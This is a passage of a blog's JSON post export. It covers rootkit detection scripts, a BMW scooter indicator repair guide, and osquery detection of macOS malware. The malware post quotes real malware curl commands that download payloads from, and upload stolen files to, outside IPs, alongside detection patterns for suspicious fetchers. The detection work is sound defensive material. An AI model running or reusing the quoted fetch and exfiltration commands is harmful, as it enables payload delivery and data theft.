as uid 0\"\n\ndeclare -A visible\ncd /proc || exit\n\nstart=$(date +%s)\nfor pid in *; do\n    visible[$pid]=1\ndone\n\nfor i in $(seq 2 \"$(cat /proc/sys/kernel/pid_max)\"); do\n    [[ ${visible[$i]} = 1 ]] \u0026\u0026 continue\n    [[ ! -e /proc/$i/status ]] \u0026\u0026 continue\n    [[ $(stat -c %Z /proc/$i) -ge $start ]] \u0026\u0026 continue\n\n    #  pid is a kernel thread\n    [[ $(awk '/Tgid/{ print $2 }' \"/proc/${i}/status\") != \"${i}\" ]] \u0026\u0026 continue\n\n    exe=$(readlink \"/proc/$i/exe\")\n    cmdline=$(tr '\\000' ' ' \u003c\"/proc/$i/cmdline\")\n    echo \"- hidden $(cat /proc/$i/comm)[${i}] is running ${exe}: ${cmdline}\"\ndone\n```\n\nHere's the output of this script:\n\n```log\n- hidden bash[1924] is running /usr/bin/bash: /bin/bash --login\n- hidden sleep[18518] is running /usr/bin/sleep: sleep 7200\n```\n\nTo use roughly the same logic with osquery, use the following within `sudo osqueryi` \\[[full source](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/pid-hidden-by-rootkit.sql)\\]:\n\n```sql\nWITH RECURSIVE cnt(x) AS (\n   SELECT 1\n   UNION ALL\n   SELECT x + 1\n   FROM cnt\n   LIMIT 4194304\n)\nSELECT p.*\nFROM cnt\n   JOIN processes p ON x = p.pid\nWHERE x NOT IN (\n       SELECT pid\n       FROM processes\n)\nAND p.start_time \u003c (strftime('%s', 'now') - 1)\nAND (\n       p.pgroup = p.pid\n       OR (\n           p.pid = p.parent\n           AND p.threads = 1\n       )\n)\n```\n\n## Detecting unusual kernel taints\n\nEarlier we talked about the value of `sysctl kernel.tainted` changing from 0 to 12288. Let's use the following script  to diagnose it \\[[full source](https://github.com/tstromberg/sunlight/blob/main/kernel-taint.sh)\\]:\n\n```shell\ndeclare -A table=(\n    [0]=\"proprietary module was loaded\"\n    [1]=\"module was force loaded\"\n    [2]=\"kernel running on an out of specification system\"\n    [3]=\"module was force unloaded\"\n    [4]=\"processor reported a Machine Check Exception (MCE)\"\n    [5]=\"bad page referenced or some unexpected page flags\"\n    [6]=\"taint requested by userspace application\"\n    [7]=\"kernel died recently, i.e. there was an OOPS or BUG\"\n    [8]=\"ACPI table overridden by user\"\n    [9]=\"kernel issued warning\"\n    [10]=\"staging driver was loaded\"\n    [11]=\"workaround for bug in platform firmware applied\"\n    [12]=\"externally-built (out-of-tree) module was loaded\"\n    [13]=\"unsigned module was loaded\"\n    [14]=\"soft lockup occurred\"\n    [15]=\"kernel has been live patched\"\n    [16]=\"auxiliary taint, defined for and used by distros\"\n    [17]=\"kernel was built with the struct randomization plugin\"\n    [18]=\"an in-kernel test has been run\"\n)\n\n\ntaint=$(cat /proc/sys/kernel/tainted)\n[[ $taint == 0 ]] \u0026\u0026 exit\n\necho \"kernel taint value: ${taint}\"\nfor i in $(seq 18); do\n    bit=$(($i-1))\n    match=$(($taint \u003e\u003e $bit \u00261))\n    [[ $match == 0 ]] \u0026\u0026 continue\n    echo \"* matches bit $bit: ${table[$bit]}\"\ndone\n\necho \"\"\necho \"dmesg:\"\ndmesg | grep taint\n```\n\nHere's the output of that script when this rootkit is loaded:\n\n```log\nkernel taint value: 12288\n* matches bit 12: externally-built (out-of-tree) module was loaded\n* matches bit 13: unsigned module was loaded\n\ndmesg:\n[  368.765518] reveng_rtkit: loading out-of-tree module taints kernel.\n[  368.777600] reveng_rtkit: module verification failed: signature and/or required key missing - tainting kernel\n```\n\nHere's the osquery query I generated for alerting on this kind of taint \\[[full source](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/evasion/unusually-tainted-kernel-linux.sql)\\]:\n\n```sql\nSELECT current_value AS value,\n    current_value \u0026 65536 AS is_aux,\n    current_value \u0026 8192 is_unsigned,\n    current_value \u0026 4096 AS out_of_tree,\n    current_value \u0026 512 AS kernel_warning,\n    current_value \u0026 614 AS requested_by_userspace,\n    current_value \u0026 8 AS force_unloaded,\n    current_value \u0026 4 AS out_of_spec,\n    current_value \u0026 2 AS force_loaded,\n    current_value \u0026 1 AS proprietary\nFROM system_controls\nWHERE name = \"kernel.tainted\"\n    AND current_value NOT IN (0, 512, 12289, 4097)\n```\n\n## Detecting unusual /dev entries\n\nWe noted an unusual device earlier, which is used to communicate to the rootkit:\n\n```shell\ncrw-------  1 root root 247,   0 Feb 23 15:53 etx_device\n```\n\nThe \"247\" in the output there is the major device number, which generally maps to a kernel module. To find unexpected devices like this, you can either whitelist expected device names, or expected major numbers. We'll do it both ways here.\n\nTo use major number logic, you'll want to refer to \u003chttps://www.kernel.org/doc/Documentation/admin-guide/devices.txt\u003e. Armed with this information, there are two data sources to check, /proc/devices, and /dev. The first one is interesting, as it's a map of major numbers to drivers:\n\n```shell\nCharacter devices:\n  1 mem\n  4 /dev/vc/0\n  4 tty\n…\n189 usb_device\n226 drm\n247 etx_Dev\n248 aux\n```\n\nOne major flaw in my plan is that there are sections of dynamically generated major numbers, for instance, our suspicious 247 major device lands squarely in this section:\n\n```log\n240-254 block LOCAL/EXPERIMENTAL USE\n```\n\nSo, I went with a hybrid approach to discover devices that are commonly found on UNIX systems, by major number when possible, and the device name when it's dynamic \\[[full source](https://github.com/tstromberg/sunlight/blob/main/kernel-taint.sh)\\]:\n\n```shell\n\ndeclare -A expected_major=(\n    [1]=\"memory\"\n    [2]=\"pty master\"\n    [3]=\"pty slave\"\n    [4]=\"tty\"\n    [5]=\"alt tty\"\n    [6]=\"parallel\"\n    [7]=\"vcs\"\n    # [8]=\"scsi tape\"\n    [9]=\"md\"\n    [10]=\"misc\"\n    [13]=\"input\"\n    [21]=\"scsi\"\n    [29]=\"fb\"\n...\n)\n\ndeclare -A expected_low=(\n    [\"bsg/\"]=1\n    [\"dma_heap/system\"]=1\n...\n)\n\ndeclare -A expected_high=(\n    [\"drm_dp_aux\"]=1\n    [\"iiodevice\"]=1\n)\n\nfor path in $(find /dev -type c); do\n    hex=$(stat -c '%t' $path)\n    major=$(( 16#${hex} ))\n    pattern=$(echo $path | cut -d/ -f3- | tr -d '[:0-9]')\n\n    # Unix98 PTY Slaves\n    (( major \u003e= 136 \u0026\u0026 major \u003c= 143 )) \u0026\u0026 continue\n    [[ ${expected_major[$major]} != \"\" ]] \u0026\u0026 continue\n\n    class=\"UNKNOWN\"\n    (( major \u003e= 60 \u0026\u0026 major \u003c= 63 )) \u0026\u0026 class=\"LOCAL/EXPERIMENTAL\"\n    (( major \u003e= 120 \u0026\u0026 major \u003c= 127 )) \u0026\u0026 class=\"LOCAL/EXPERIMENTAL\"\n    if (( major \u003e= 234 \u0026\u0026 major \u003c= 254 )); then\n        class=\"low dynamic\"\n        [[ ${expected_low[$pattern]} == 1 ]] \u0026\u0026 continue\n    fi\n\n    if (( major \u003e= 384 \u0026\u0026 major \u003c= 511 )); then\n        class=\"high dynamic\"\n        [[ ${expected_high[$pattern]} == 1 ]] \u0026\u0026 continue\n    fi\n\n    echo \"${class} major device ${pattern}[${major}]\"\n    echo \"* $(ls -lad $path)\"\n    echo \"* /proc/devices: $(sed -n '/Block devices:/q;p' /proc/devices | grep -e \"^ *${major}\")\"\n    echo \"\"\ndone\n```\n\nHere is the output of this script on a system with reveng_rtkit installed:\n\n```shell\nlow dynamic major device etx_device[247]\n* crw------- 1 root root 247, 0 Mar  3 19:48 /dev/etx_device\n* /proc/devices: 247 etx_Dev\n```\n\nIn osquery, there is no reliable way to determine a major number, as it depends on a local magic database. There we'll rely on a simple whitelist of device names \\[[full source](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/persistence/unexpected-device.sql)\\]:\n\n```sql\nSELECT *\nFROM\n file\nWHERE\n (\n   path LIKE '/dev/%'\n   OR directory LIKE '/dev/%'\n )\n AND path_expr NOT IN (\n   '/dev/acpi_thermal_rel',\n   '/dev/autofs',\n   '/dev/block/',\n   '/dev/block/:',\n   '/dev/bsg/',\n   '/dev/bsg/:::',\n…\n)\n```\n\n## In Closing\n\nIn a future episode, we'll explore what it takes to detect an eBPF rootkit. The general philosophy is the same: know what to expect from your system and detect half-hearted illusions. I hope you enjoyed this article!\n\nIf you have questions, find me at [@tstromberg.](https://triangletoot.party/@thomrstrom \"triangletoot.party/@thomrstrom\")","tags":[],"images":["https://i.snap.as/uzmvIJhe.jpg"],"paid":false,"full_post_url":"","views":7936,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"eiqw2gvmbgyeiw4x","slug":"bmw-ce-04-indicator-replacement-procedure","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-01-21T14:31:54Z","updated":"2023-01-22T15:39:24Z","title":"BMW CE 04: Indicator Replacement Procedure","body":"![](https://i.snap.as/fKnZboqD.jpg)\n\nA couple of weeks ago, I had the misfortune of breaking the indicator light off my BMW CE 04 scooter. It was through no fault of its own, I just underestimated the amount of suspension travel when mounting a bicycle on the back of it using the [2x2Cycles Moto Bicycle Carrier](https://www.2x2cycles.com/product/moto-bicycle-rack/).\n\nGive yourself 3-4 hours to perform these steps as it can require the removal and reinstallation of up to 25 bolts. Even if you are generally bad at mechanical things, this is an entirely doable procedure with the correct tools.\n\nCredit to [Guru Shudamundi](https://www.facebook.com/groups/417926070093644/user/100067534426885/), who posted a summarized version in a [BMW CE 04 Facebook Forum thread](https://www.facebook.com/groups/417926070093644/posts/598112305408352/), which gave me the courage to fix my own bike.\n\n\u003c!--more--\u003e\n\n## Required Equipment\n\n* Replacement “Multifunctional turn signal” ([63 23 7 924 982](https://www.ascycles.com/Products/ProductID/71676) in the USA)\n* T25, T30 Torx bit or wrenches\n* T50 Torx bit\n* Socket Wrench - wheel removal\n* Torque Wrench (60nm) - wheel installation\n* Pliers\n* Small adjustable wrench\n* Cable tie cutter or scissors\n* 5x Small Tie Wraps\n\nPlease note that the turn signal part is subtly different in the USA - this procedure will show the USA parts, but the steps are effectively the same. You can order the replacement part from your BMW dealer, or online dealers such as A\u0026S Cycles: it’s a common part that is shared with the CE04, M1000RR, R nineT,  S1000\\*R series of bikes.\n\n## **Step 1: Failed Indicator Removal**\n\nUnscrew what’s left of the failed indicator, as well as the protective cowl in place, using a T30 and T25 torx wrench. You will also need an adjustable wrench to keep the nut on the other side from rotating freely.\n\n![](https://i.snap.as/sVS3tp1i.jpg)\n\n## **Step 1: Wheel Removal**\n\nWith the bike still on the side-stand, loosen each of the five T50 wheel bolts by a few turns. It’ll be much easier to do so now than when it’s on the center-stand.\n\n![](https://i.snap.as/ZGNcecNR.jpg)\n\nNow put the CE-04 up on the center-stand for the removal, ensuring that the center-stand doesn’t sink into the ground. If you don’t have a center-stand, get creative with something else sturdy.\n\n![](https://i.snap.as/4zaQu1KI.jpg)\n\nPartially unscrew each bolt by two turns using a T50 Torx wrench. With some wiggling, you should be able to pull the wheel straight out toward you. I ended up loosening the mud guard as the wheel I didn’t have enough clearance with the gravel.\n\n## **Step 2: Panel Removal**\n\nYou can summarize this step as: remove every bolt and tie wrap in your way, but feel free to keep reading for the gory details.\n\nYou’ll first need to remove this cover from the belt drive side of the bike with a T25 torx bit.\n\n![](https://i.snap.as/344QGuvJ.jpg)\n\nUnderneath it there is another inner panel, which you should unscrew but not remove. This will give you more wiggle room to install the indicator cable that is sitting behind it (visible in the center of this picture)\n\n![](https://i.snap.as/ZvT3OjJt.jpg)\n\nDepending on which indicator needs replacement, the cable will run to either the connection you see here or the one just to the left of it, hidden beneath the clip. You’ll need to reach that clip from the wheel side. Go ahead and unscrew this T25 bolt if you haven’t already:\n\n![](https://i.snap.as/Zfu75H5l.jpg)\n\nFrom the wheel side, you can see the 3 cables leading from the license plate holder toward the front of the bike. One for each indicator and one for the brake light. Trace the wire and cut all the tie wraps keeping these cables in place. You’ll also want to undo the unusually short T25 bolt hiding under the wires here:\n\n![](https://i.snap.as/5bmpgtQL.jpg)\n\nWhile you are here under the mud flap, go ahead and undo this T25 bolt as well that helps keep the license plate attached:\n\n![](https://i.snap.as/zGzygCx0.jpg)\n\nYou’ll also need to undo these two T30 bolts on the top side of the mud flap. Once that’s done, the light assembly will only be held on by cables.\n\n![](https://i.snap.as/KMMwEzE9.jpg)\n\nOnce the lights and plate are free, you will find one more tie wrap to cut:\n\n![](https://i.snap.as/E2Hvi2cT.jpg)\n\nIf you haven’t done so already, unscrew the remainder of your broken light with a T25 torx bit. You will likely need a small wrench to keep the nut stationary while doing so. Once you’ve unscrewed the protective cowl,  cut the old light cable.\n\n![](https://i.snap.as/YRgPWys8.jpg)\n\nWith the broken cable cut, follow the cable to where it plugs into the bike. For the left indicator, it’s hidden under this clip that needs to be popped off. I used a pair of pliers, but if you hate your hands, you can do it with your fingers.\n\n![](https://i.snap.as/OVu33Khx.jpg)\n\n## **Step 3: Wiring in the new indicator**\n\nBefore doing anything else, you must thread the new connector through the tail light assembly. It’s a tight curve that might seem daunting initially, but it can be done!\n\n![](https://i.snap.as/DG8HTx8F.jpg)\n\nOnce you have the cable end through, put the protective cowl on the indicator to prepare it for attachment back to the light assembly:\n\n![](https://i.snap.as/aVrr5tdj.jpg)\n\nGrab a wrench and T25 torx bit to screw the indicator lamp into the main light assembly.\n\n![](https://i.snap.as/moRnxpkr.jpg)\n\nReplace the tie wrap you cut within the license plate assembly:\n\n![](https://i.snap.as/xqcArPAk.jpg)\n\nNow things are secure enough that you can safely plug the indicator wire in if you haven’t already, and give it a try before reassembly.\n\n![](https://i.snap.as/VatboiFr.jpg)\n\n## **Step 4: Panel Reassembly**\n\nNow that you’ve confirmed the new light works, it’s time to put the bike back together!\n\nStart by reinstalling the license plate and light assembly back onto the mudguard with two T30 bolts on the outside. Attach the unusually short T25 bolt that lives below the cables (seen here between the 2nd and 3rd tie wrap from the left):\n\n![](https://i.snap.as/p30OhcUV.jpg)\n\nVerify the routing of your cables, and then replace the 4 tie wraps that you cut earlier:\n\n![](https://i.snap.as/A8wLY6E3.jpg)\n\nOnce everything seems correct, install the final T25 bolt for the tail light assembly, underneath the mud guard.\n\n![](https://i.snap.as/LRhZrcBj.jpg)\n\nNow cut the tie wraps before we go back to the belt-side of the vehicle, where we will begin putting the other panels back in place. On the inner panel between the shock and the belt, screw in the top-right and bottom-most T25 screws.\n\n![](https://i.snap.as/9SME1luq.jpg)\n\nNow reinstall the outer cover with 3 final T25 bolts. Screw the top bolt first, as the clasp may fall off - you may need to hold it in place with a pair of pliers.\n\nReinstall any other remaining T25 bolts you might have unscrewed from the body. In my case, I also undid a T25 bolt from the front of the mud cover to give myself more room to remove the wheel:\n\n![](https://i.snap.as/gCcvzzJO.jpg)\n\n## **Step 5: Wheel Installation**\n\nAt this point, your cables should be all routed properly, the body on, cables cut, bolts screwed in, and things looking clean overall:\n![](https://i.snap.as/BwCS94o1.jpg)\n\nIf so, lift the wheel into the right place, and screw the T50 torx bolts back in with a star pattern, finger tight first. Then come back with a torque wrench and tighten each bolt to 60nm (44ft/lb) in a star pattern.\n\n![](https://i.snap.as/h7iwTtGE.jpg)\n\nNow go ride that thing!","tags":[],"images":["https://i.snap.as/fKnZboqD.jpg","https://i.snap.as/sVS3tp1i.jpg","https://i.snap.as/ZGNcecNR.jpg","https://i.snap.as/4zaQu1KI.jpg","https://i.snap.as/344QGuvJ.jpg","https://i.snap.as/ZvT3OjJt.jpg","https://i.snap.as/Zfu75H5l.jpg","https://i.snap.as/5bmpgtQL.jpg","https://i.snap.as/zGzygCx0.jpg","https://i.snap.as/KMMwEzE9.jpg","https://i.snap.as/E2Hvi2cT.jpg","https://i.snap.as/YRgPWys8.jpg","https://i.snap.as/OVu33Khx.jpg","https://i.snap.as/DG8HTx8F.jpg","https://i.snap.as/aVrr5tdj.jpg","https://i.snap.as/moRnxpkr.jpg","https://i.snap.as/xqcArPAk.jpg","https://i.snap.as/VatboiFr.jpg","https://i.snap.as/p30OhcUV.jpg","https://i.snap.as/A8wLY6E3.jpg","https://i.snap.as/LRhZrcBj.jpg","https://i.snap.as/9SME1luq.jpg","https://i.snap.as/gCcvzzJO.jpg","https://i.snap.as/BwCS94o1.jpg","https://i.snap.as/h7iwTtGE.jpg"],"paid":false,"full_post_url":"","views":2130,"likes":0,"collection":{"alias":"thomrstrom","title":"unfinished.bike","description":"a compendium of half-finished projects by thomas strömberg - \u003ca rel=\"me\" href=\"https://triangletoot.party/@thomrstrom\"\u003e@thomrstrom\u003c/a\u003e","style_sheet":"","public":true,"views":6018,"domain":"unfinished.bike","url":"https://unfinished.bike/","monetization_pointer":"","verification_link":"","total_posts":0}},{"id":"u0ugofqtqj61hhyy","slug":"behavioral-detection-of-macos-malware-using-osquery","appearance":"norm","language":"en","rtl":false,"type":"post","created":"2023-01-10T21:24:21Z","updated":"2023-01-10T21:38:43Z","title":"Behavioral detection of macOS malware using osquery","body":"![](https://i.snap.as/HrCc01yk.jpg)\n\nAs part of my duties at [Chainguard](https://chainguard.dev/), I maintain an osquery based detection pipeline. As an open-source first company, we naturally open-sourced our production queries as part of the [osquery-defense-kit](https://github.com/chainguard-dev/osquery-defense-kit). When new Malware reports are released, I'll typically consume them to gather ideas for improving the effectiveness of our queries.\n\nWith the new year upon us, Objective See recently published a [retrospective report on the most interesting Mac Malware of 2022](https://objective-see.org/blog/blog_0x71.html). This was an excellent opportunity to review the evidence to see which queries are the most effective. I am additionally thankful that Objective See publishes Malware binaries for additional review, as some of the evidence this report relies on had to be extracted from the original binaries.\n\n\u003c!--more--\u003e\n\n## Which queries found which Malware?\n\nThese are the top alerts from the [osquery-defense-kit](https://github.com/chainguard-dev/osquery-defense-kit) that you should expect to fire if one of these Malware packages from the report are running on a host:\n\n| Malware                                                                                                                                                                                     | Talkers | ExecDir | New Executable | Launchd Arguments | Shell Parents | Sketchy Fetchers | Tmp Executables | Fetcher Parents |\n| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ------- | -------------- | ----------------- | ------------- | ---------------- | --------------- | --------------- |\n| [SysJoker](https://www.intezer.com/blog/incident-response/new-backdoor-sysjoker/)                                                                                                           | Y       | Y       | Y              | Y                 | Y             | Y                |                 |                 |\n| [DazzleSpy](https://www.welivesecurity.com/2022/01/25/watering-hole-deploys-new-macos-malware-dazzlespy-asia/)                                                                              | Y       | Y       | Y              | Y                 | Y             |                  | Y               |                 |\n| [Coinminer](https://www.trendmicro.com/en_us/research/22/b/latest-mac-coinminer-utilizes-open-source-binaries-and-the-i2p-network.html)                                                     | Y       | Y       | Y              | Y                 | Y             |                  | Y               |                 |\n| [GIMMICK](https://www.volexity.com/blog/2022/03/22/storm-cloud-on-the-horizon-gimmick-malware-strikes-at-macos/)                                                                            | Y       | Y       | Y              | Y                 | Y             | Y                |                 | Y               |\n| [oRat](https://www.trendmicro.com/en_us/research/22/d/new-apt-group-earth-berberoka-targets-gambling-websites-with-old.html)                                                                | Y       | Y       | Y              |                   |               | Y                | Y               | Y               |\n| [CrateDepression](https://www.sentinelone.com/labs/cratedepression-rust-supply-chain-attack-infects-cloud-ci-pipelines-with-go-malware/)                                                    | Y       | Y       | Y              | Y                 |               | Y                | Y               | Y               |\n| [pymafka](https://blog.sonatype.com/new-pymafka-malicious-package-drops-cobalt-strike-on-macos-windows-linux)                                                                               | Y       | Y       | Y              | Y                 | Y             | Y                |                 | Y               |\n| [VPN Trojan (Covid)](https://www.sentinelone.com/blog/from-the-front-lines-new-macos-covid-malware-masquerades-as-apple-wears-face-of-apt/)                                                 | Y       | Y       | Y              | Y                 |               | Y                |                 |                 |\n| [CloudMensis](https://www.welivesecurity.com/2022/07/19/i-see-what-you-did-there-look-cloudmensis-macos-spyware/?utm_source=twitter\u0026utm_medium=cpc\u0026utm_campaign=wls\u0026utm_term=macos-spyware) | Y       | Y       | Y              | Y                 | Y             |                  |                 |                 |\n| [rShell (Mimi)](https://www.trendmicro.com/pl_pl/research/22/h/irontiger-compromises-chat-app-Mimi-targets-windows-mac-linux-users.html)                                                    | Y       | Y       | Y              |                   | Y             |                  | Y               |                 |\n| [Insekt](https://blog.talosintelligence.com/alchimist-offensive-framework/)                                                                                                                 | Y       | Y       | Y              |                   |               |                  | Y               | Y               |\n| [KeySteal](https://www.trendmicro.com/en_us/research/22/k/pilfered-keys-free-app-infected-by-malware-steals-keychain-data.html)                                                             | Y       | Y       |                | Y                 |               |                  |                 |                 |\n| [SentinelSneak](https://www.reversinglabs.com/blog/sentinelsneak-malicious-pypi-module-poses-as-security-sdk)                                                                               | Y       |         |                |                   | Y             | Y                |                 | Y               |\n|\n\nOther queries that you should expect to see triggered are: `exotic-commands`, `unexpected-library-entries`, and `fake-apple-launchd-entries`.\n\n## Generically detecting Malware via behavior analysis\n\nAlmost uniformly, an intrusion on a macOS or Linux host is going to go through the following steps:\n\n* Fetch: Get a program to install from an external source\n* Drop: Place a program in a known writeable location within the filesystem\n* Prepare: Modify the execution settings of that program (chmod +x, xattr -c)\n* Execute: Run the newly installed program\n* Persist: Configure persistence for that program across reboots\n* Communicate: Contact an external host via TCP/IP\n\nLooking back at our table of matching queries, they all map to one of these stages. Let's dive into each of these stages and see what each query is doing under the hood.\n\n## Fetch: Finding Sketchy Fetchers\n\nThis is one of my personal favorite queries. The first step in nearly every\ninfection is to download additional stages, and the most popular way to do this without any additional code is [curl](https://curl.se/).\n\nWhen an attacker invokes curl, they typically do so with quirks that make it stand out from other callers:\n\n* `-k` is used to turn off SSL validation\n* Flags such as `--connect-timeout` are often used to improve reliability on poor connections\n* Non-standard ports are used\n* The target is often an IP\n* When the target is DNS, it is often in an atypical TLD\n* Rarely, but occasionally runs curl or wget as root\n\nCan you combine all these quirks into a single query? The answer is yes!\n\n```sql\nSELECT\n  pe.pid,\n  TRIM(pe.cmdline),\n  REGEX_MATCH (pe.cmdline, '(\\w+:\\/\\/.*)\\b', 1) AS url,\n  REGEX_MATCH (pe.cmdline, '//(\\d+\\.\\d+\\.\\d+\\.\\d+)[:/]', 1) AS ip,\n  REGEX_MATCH (pe.cmdline, ':(\\d+)', 1) AS port,\n  REGEX_MATCH (pe.cmdline, '//([\\w\\-\\.]+)[:/]', 1) AS addr,\n  REGEX_MATCH (pe.cmdline, '//[\\w\\-\\.]+\\.(\\w+)[:/]', 1) AS tld,\n  pe.cwd,\n  pe.euid,\n  p.cgroup_path,\n  pp.path AS parent_path,\n  TRIM(pp.cmdline) AS parent_cmdline\nFROM\n  process_events pe\n  LEFT JOIN processes p ON pe.pid = p.pid\n  LEFT JOIN processes pp ON pe.parent = pp.pid\nWHERE\n  pe.time \u003e (strftime('%s', 'now') -86400)\n  AND (\n    INSTR(pe.cmdline, 'wget ') \u003e 0\n    OR INSTR(pe.cmdline, 'curl ') \u003e 0\n  )\n  AND (\n    ip NOT IN ('', '127.0.0.1', '::1')\n    OR port != ''\n    OR tld NOT IN (\n      '',\n      'app',\n      'ca',\n      'cloud',\n      'com',\n      'de',\n      'dev',\n      'edu',\n      'fun',\n      'gov',\n      'io',\n      'md',\n      'mil',\n      'net',\n      'org',\n      'se',\n      'sh',\n      'so',\n      'uk'\n    )\n    OR pe.cmdline LIKE '%.onion%'\n    OR pe.cmdline LIKE '%curl -k%'\n    OR pe.cmdline LIKE '%curl -sL %'\n    OR pe.cmdline LIKE '%curl%--connect-timeout%'\n    OR pe.cmdline LIKE '%curl%--output /dev/null%'\n    OR pe.cmdline LIKE '%curl%--O /dev/null%'\n    OR pe.cmdline LIKE '%curl%--insecure%'\n    OR pe.cmdline LIKE '%curl%-o-%'\n    OR pe.cmdline LIKE '%wget %--user-agent%'\n    OR pe.cmdline LIKE '%wget %--no-check-certificate%'\n    OR pe.cmdline LIKE '%wget -nc%'\n    OR pe.cmdline LIKE '%wget -t%'\n    OR pe.euid \u003c 500\n  )\n```\n\nThe full query can be found here: [sketchy-fetcher-events.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/sketchy-fetcher-events.sql).\n\nHere are some examples of how the macOS malware from 2022 is invoking fetchers in a way that matches the above query:\n\n* Gimmick: `curl -o %s http://cgi1.apnic.net/cgi-bin/my-ip.php --connect-timeout 10 -m 20`\n* pymafka: `curl -A O -o- -L http://39.107.154[.]72/env`\n* SentinelSneak: `curl -k -F \"file=@\" \u003czip\u003e https://54.254.189[.]27/api/v1/file/upload`\n* oRAT: `curl -sL https://d.github[.]wiki/mac/darwinx64 -O`\n\nIt's worth noting that this query includes `processes.cgroup_path`, which can be useful to filter out containerized applications on Linux, as they will often be run from lower euids.\n\n## Drop: Executables in temporary directories\n\nIt's very rare for executables to be found in `/tmp` or `/var/tmp`, particularly on macOS; the former is deleted on reboot. It is however popular for Malware to store binaries here, as it is reliably writeable across UNIX platforms, as folks rarely poke around these folders.\n\nIn the examples we examined above, there are a few examples:\n\n* pymafka: `/var/tmp/zad`\n* CoinMiner: `/tmp/lauth`\n* DazzleSpy: `/tmp/airportpaird`\n* CrateDepression: `/tmp/git-updater.bin`\n* MiMi: `/tmp/rshell`\n* Alchimist: `/tmp/Res/Payload`\n* Gimmick: `/tmp/*`\n\nHere's a query that should find all of those examples and more:\n\n```sql\nSELECT\n  file.path,\n  uid,\n  gid,\n  mode,\n  REGEX_MATCH (RTRIM(file.path, '/'), '.*\\.(.*?)$', 1) AS extension,\n  file.mtime,\n  file.size,\n  hash.sha256,\n  magic.data\nFROM\n  file\n  LEFT JOIN hash on file.path = hash.path\n  LEFT JOIN magic ON file.path = magic.path\nWHERE\n  (\n    file.directory = '/tmp' OR\n    file.directory LIKE '/tmp/%%'\n    file.directory = '/var/tmp' OR\n    file.directory LIKE '/var/tmp/%%'\n  )\n  AND file.type = 'regular'\n  AND size \u003e 10\n  -- Don't alert if the file is only on disk for a moment\n  AND (strftime('%s', 'now') - ctime) \u003e 30\n  AND (\n    file.mode LIKE '%7%'\n    or file.mode LIKE '%5%'\n    or file.mode LIKE '%1%'\n  )\n  -- macOS updates\n  AND NOT file.directory LIKE '/tmp/msu-target-%'\n  -- Other programs\n  AND NOT file.path LIKE '/tmp/ko/bin/%'\n  AND NOT extension IN ('sh', 'json')\n  AND NOT file.name IN ('configure', 'mkinstalldirs')\n```\n\nIf you have developers, you may need to tune this carefully, as they will occasionally extract source code into /tmp and build code there if it is disposable. This behavior appears more common with Linux developers than macOS developers.\n\n## Execute: Unexpected Executable Directory\n\nMalware typically drops an initial program in a known writeable directory that is not easily noticed. Malware authors rarely choose directories where other binaries are already installed. The gist of this query is: to detect which programs are running from places we don't usually see programs running from.\n\n```sql\nSELECT\n  p.pid,\n  p.name,\n  p.path,\n  p.euid,\n  p.gid,\n  f.ctime,\n  f.directory AS dir,\n  REGEX_MATCH (\n    REPLACE(f.directory, u.directory, '~'),\n    '(~/.*?/)',\n    1\n  ) AS top_homedir, -- 1 level deep\n  p.cmdline,\n  signature.identifier,\n  signature.authority\nFROM\n  processes p\n  LEFT JOIN file f ON p.path = f.path\n  LEFT JOIN users u ON p.uid = u.uid\n  LEFT JOIN signature ON p.path = signature.path\nWHERE\n  dir NOT IN (\n    '/bin',\n    '/opt/usr/bin',\n    '/opt/X11/bin',\n    '/opt/X11/libexec',\n    '/sbin',\n    '/usr/bin',\n    '/usr/lib',\n    '/usr/lib/bluetooth',\n    '/usr/lib/cups/notifier',\n    '/usr/libexec',\n    '/usr/libexec/ApplicationFirewall',\n    '/usr/libexec/AssetCache',\n    '/usr/libexec/firmwarecheckers',\n    '/usr/libexec/firmwarecheckers/eficheck',\n    '/usr/libexec/rosetta',\n    '/usr/lib/fwupd',\n    '/usr/lib/ibus',\n    '/usr/lib/system',\n    '/usr/local/bin',\n    '/usr/sbin'\n  )\n  AND top_homedir NOT IN (\n    '~/Applications/',\n    '~/Applications (Parallels)/',\n    '~/go/',\n    '~/bin/'\n  )\n  AND dir NOT LIKE '/Applications/%'\n  -- Allow these anywhere (put last because it's slow to query signatures)\n  AND signature.authority NOT IN (\n    'Apple iPhone OS Application Signing',\n    'Apple Mac OS Application Signing',\n    'Developer ID Application: Adobe Inc. (JQ525L2MZD)',\n    'Software Signing'\n  )\n```\n\nThis query is low maintenance, but if you have a lot of developers, you may find yourself adding more home directory or temp directory exceptions. For an event-based version of this query, see [execution/unexpected-execdir-events-macos.sql](https://github.com/chainguard-dev/osquery-defense-kit/blob/main/detection/execution/unexpected-execdir-events-macos.sql).\n\n## Execute: Unexpected New Executable\n\nMalware will typically execute a program as soon as it hits the disk. It's pretty easy to write a query to see\nwhich software was executed shortly after the executable birth time (btime) or inode change time (ctime).\n\nHere's a basic query you can use to see which programs were started within 2 minutes (120 seconds) of being installed and were started in the last day (86400 seconds).\n\n```sql\nSELECT\n  p.pid,\n  p.path,\n  p.name,\n  p.cmdline,\n  p.cwd,\n  p.euid,\n  p.parent,\n  f.directory,\n  f.ctime,\n  f.btime,\n  f.mtime,\n  p.start_time,\n  signature.authority,\n  signature.identifier\nFROM\n  processes p\n  LEFT JOIN file f ON p.path = f.path\n  LEFT JOIN signature ON p.path = signature.path\nWHERE\n  p.start_time \u003e 0\n  AND f.ctime \u003e 0\n  AND p.start_time \u003e (strftime('%s', 'now') - 86400)\n  AND (p.start_time - MAX(f.ctime, f.btime)) \u003c 120\n  AND p.start_time \u003e= MAX(f.ctime, f.ctime)\n  AND signature.authority NOT IN (\n    'Apple Mac OS Application Signing',\n    'Developer ID Application: Adobe Inc. (JQ525L2MZD)',\n    'Software Signing'\n  )\n  AND NOT p.path LIKE '/Applications/%.app/%'\n  AND NOT (\n    p.path LIKE 